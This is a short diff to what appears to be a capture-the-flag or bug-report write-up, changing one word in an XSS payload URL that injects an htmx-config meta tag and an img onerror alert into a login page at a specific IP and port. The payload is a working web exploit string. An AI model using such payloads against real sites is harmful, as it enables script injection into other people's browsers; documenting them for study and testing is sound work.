@@ -3,7 +3,7 @@
 ## Bug 1 - XSS on external/internal
 
 ```
-http://35.200.122.11:20000/login?timeout={%22indicatorClass%22:%22%3C/style%3E%3Cimg%20src=1%20onerror=alert(1)%3E%3Cstyle%3Ess%22}%27%20x=%27&return_url=fuck://11%27%20content=%27hehehe%27%20http-equiv=%27asdf%27%20name=%27htmx-config
+http://35.200.122.11:20000/login?timeout={%22indicatorClass%22:%22%3C/style%3E%3Cimg%20src=1%20onerror=alert(1)%3E%3Cstyle%3Ess%22}%27%20x=%27&return_url=invalidscheme://11%27%20content=%27hehehe%27%20http-equiv=%27asdf%27%20name=%27htmx-config
 ```
 
 ## Bug 2 - Store a malicious URL before returning with an error
